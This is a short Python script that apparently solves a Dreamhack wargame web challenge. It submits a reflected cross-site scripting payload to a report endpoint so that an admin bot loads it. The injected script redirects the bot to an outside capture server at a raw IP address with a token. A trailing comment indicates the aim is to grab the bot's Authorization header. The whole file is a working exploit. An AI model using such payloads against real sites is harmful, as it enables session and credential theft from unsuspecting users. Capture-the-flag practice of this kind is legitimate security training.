import requests

url = 'http://host3.dreamhack.games:22234'
webhix = 'http://194.11.226.88:8080'
token = 'ho003e95e4e89612d1a7875faf5bc73eb5'
check_url = f'{webhix}/?token={token}'

payload = f'{url}/intro?name=<script>location.href="{webhix}/r/{token}"</script>&detail="asdf"'

res = requests.post(f'{url}/report', data={'path': payload})

# Get Authorization Header
